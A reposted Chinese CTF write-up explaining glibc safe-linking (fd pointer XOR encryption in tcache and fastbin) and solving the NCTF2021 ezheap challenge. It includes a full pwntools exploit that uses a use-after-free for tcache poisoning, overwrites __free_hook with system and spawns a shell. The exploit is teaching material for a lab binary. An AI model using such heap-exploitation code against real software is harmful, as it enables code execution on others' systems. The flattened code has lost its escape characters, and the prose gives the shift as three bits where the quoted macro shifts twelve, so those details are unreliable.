# glibc高版本堆题攻击之safe unlink

> 原文: https://www.ctfiot.com/65732.html
> ID: 65732

本文为看雪论坛优秀文章

看雪论坛作者ID：Nameless_a

测试版本2.33_5

从2.32版本开始，tcache和fastbin里面就加入了一个safe unlink的机制，主要是对fd指针的一个异或操作来使得不那么好利用UAF等需要fd指针的手法进行地址泄露以及进一步的任意地址写。

具体的效果如下：

发现fd指针的值为0x562e784a3，如果是低版本的话，应该是0x562e784a3000也就是上一个堆块的地址。可以看出fd指针被加密了。

那么是怎么加密的呢，我们看看源码：

/* Safe-Linking: Use randomness from ASLR (mmap_base) to protect single-linked lists of Fast-Bins and TCache. That is, mask the "next" pointers of the lists' chunks, and also perform allocation alignment checks on them. This mechanism reduces the risk of pointer hijacking, as was done with Safe-Unlinking in the double-linked lists of Small-Bins. It assumes a minimum page size of 4096 bytes (12 bits). Systems with larger pages provide less entropy, although the pointer mangling still works. *//* 加密函数 */#define PROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))/* 解密函数 */#define REVEAL_PTR(ptr) PROTECT_PTR (&ptr, ptr)

pos是我们当前的堆块的fd指针的地址，ptr是未加密的时候fd指针应该指向的堆地址（也就是前一个被放进tcache的堆块的fd指针的位置）。

说通俗一点，当堆块P被free的时候，P的fd要放前一个堆块的ptr（tcache里面放的就直接是fd指针的位置了）。而放置的时候，会把&P->fd这个堆地址右移三位，当作一个密钥，来异或ptr这个明文，最后在把得到的密文放在P->这个位置。

我们再多放进tcache一个堆块测试一下：

没问题。那么解密过程又是怎么的呢？我们这里演草一下，就很清晰明了了：

结论就是，密文异或密钥就得到明文了（这里感谢二进制密码爷hash_hash师傅https://hash-hash.github.io/的指点）。

模板题：【NCTF2021】ezheap

版本

同测试版本

保护

ida

很常见的菜单题，实现了增删改查，然后删的时候有个UAF：

不过并没有完全UAF，没有清空指针，但是因为清空了size数组上对应的值，不能再edit了。但是我们可以通过在note段放两个相同的堆指针（因为没有清空，add free add就好了），free那个被清空size的idx，然后就能通过另一个idx对bin中的堆块进行修改了，就可以通过edit将它的fd指针设置为(__free_hook ^ (pos>>3))实现tcache poison然后get shell。

exp
from pwn import *from hashlib import sha256import base64context.log_level='debug'#context.arch = 'amd64'context.arch = 'amd64'context.os = 'linux' def z(): gdb.attach(r) def cho(num): r.sendafter(">> ",str(num)) def add(size,con): cho(1) r.sendafter("Size: ",str(size)) r.sendafter("Content: ",con) def edit(idx,con): cho(2) r.sendafter("Index: ",str(idx)) r.sendafter("Content: ",con) def delet(idx): cho(3) r.sendafter("Index: ",str(idx)) def show(idx): cho(4) r.sendafter("Index: ",str(idx)) def exp(): global r global libc libc=ELF('./libc-2.33.so') r=process('./ezheap') ##[+]:
leak libc && heap for i in range(0,8): add(0x80,'nameless') for i in range(1,8): delet(i) ##z() delet(0) show(1) heap=u64(r.recv(5).ljust(8,'x00')) key=heap heap<<=12 log.success('heap:'+hex(heap)) show(0) libcbase=u64(r.recvuntil('x7f')[-6:].ljust(8,'x00'))-0x1e0c00 log.success('libcbase:'+hex(libcbase)) ##[+]:
set libc_func one=[0xe3b2e,0xe3b31,0xe3b34] free_hook=libcbase+libc.sym['__free_hook'] system=libcbase+libc.sym['system'] ##onegadget=libcbase+one[0] ##UAF && poison to get shell cry_free_hook=(free_hook)^key add(0x80,'nameless') delet(7) edit(8,p64(cry_free_hook)+'n') add(0x80,'/bin/shx00') ##9 add(0x80,p64(system)) delet(9) r.interactive() if __name__ == '__main__': exp()

参考博客

2021 NCTF ezheap Writeup (glibc2.32 以上 UAF) | SkYe231 Blog (mrskye.cn)

https://www.mrskye.cn/archives/16cb363f/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90

看雪ID：Nameless_a

https://bbs.pediy.com/user-home-943085.htm

*本文由看雪论坛 Nameless_a 原创，转载请注明来自看雪社区

峰会官网：https://meet.kanxue.com/kxmeet-6.htm

# 往期推荐

1.进程 Dump & PE unpacking & IAT 修复 – Windows 篇

2.NtSocket的稳定实现，Client与Server的简单封装，以及SocketAsyncSelect的一种APC实现

3.如何保护自己的代码？给自己的代码添加NoChange属性

4.针对某会议软件，简单研究其CEF框架

5.PE加载过程 FileBuffer-ImageBuffer

6.APT 双尾蝎样本分析

球分享

球点赞

球在看

点击“阅读原文”，了解更多！

原文始发于微信公众号（看雪学苑）：glibc高版本堆题攻击之safe unlink

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/8-1666616680.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666616680.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666616680.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666616681.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666616681.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666616681.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1666616682.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666616682.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666616682.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666616685.jpeg)